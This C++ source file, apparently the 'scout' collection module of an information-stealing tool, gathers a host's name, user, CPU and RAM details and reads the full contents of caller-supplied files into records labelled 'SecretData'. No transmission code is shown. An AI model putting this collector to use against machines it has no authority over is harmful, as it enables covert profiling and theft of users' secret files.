#include "scout.hpp"

#include <unistd.h>
#include <pwd.h>
#include <sys/utsname.h>
#include <sys/sysinfo.h>
#include <thread>
#include <array>
#include <filesystem>
#include <fstream>
#include <vector>

namespace {

    std::optional<std::vector<std::byte>> read_file_bytes(const std::filesystem::path& path) {
        std::ifstream file(path, std::ios::binary | std::ios::ate);
        if (!file) return std::nullopt;

        const std::streamsize size = file.tellg();
        if (size <= 0) return std::nullopt;
        file.seekg(0);

        std::vector<std::byte> bytes(static_cast<std::size_t>(size));
        if (!file.read(reinterpret_cast<char*>(bytes.data()), size)) {
            return std::nullopt;
        }

        return bytes;
    }

}

namespace scoutreg {

    std::optional<SystemInfo> collect_system_info() {
        SystemInfo info;

        load_hostname(info);
        load_username(info);
        load_cpu(info);
        load_ram(info);
        
        return info;
    }

    void load_hostname(SystemInfo& info) {
        std::array<char, 256> host_buffer{};
        if (gethostname(host_buffer.data(), host_buffer.size()) == 0) {
            info.hostname = host_buffer.data();
        }
    }

    void load_username(SystemInfo& info) {
        if (const auto* pw = getpwuid(geteuid()); pw != nullptr && pw->pw_name != nullptr) {
            info.username = pw->pw_name;
        } else if (const char* user_env = getenv("USER"); user_env != nullptr) {
            info.username = user_env;
        }
    }

    void load_cpu(SystemInfo& info) {
        info.cpu_cores = std::thread::hardware_concurrency();
        if (info.cpu_cores == 0) {
            info.cpu_cores = static_cast<uint32_t>(sysconf(_SC_NPROCESSORS_ONLN));
        }
        struct utsname uname_data{};
        if (uname(&uname_data) == 0) {
            info.cpu_arch = uname_data.machine;
        }
    }

    void load_ram(SystemInfo& info) {
        struct sysinfo mem_info{};
        if (sysinfo(&mem_info) == 0) {
            const uint64_t unit = mem_info.mem_unit > 0 ? mem_info.mem_unit : 1;
            info.total_ram = (mem_info.totalram * unit) / (1024 * 1024);
            info.available_ram = (mem_info.freeram * unit) / (1024 * 1024);
        }
    }

    std::vector<SecretData> collect_secret_data(const std::vector<std::string>& paths) {
        std::vector<SecretData> gathered;
        gathered.reserve(paths.size());

        for (const auto& path : paths) {
            if (const auto bytes = read_file_bytes(path)) {
                gathered.push_back(SecretData{
                    .filename = std::filesystem::path(path).filename().string(),
                    .content  = std::move(*bytes)
                });
            }
        }

        return gathered;
    }

}
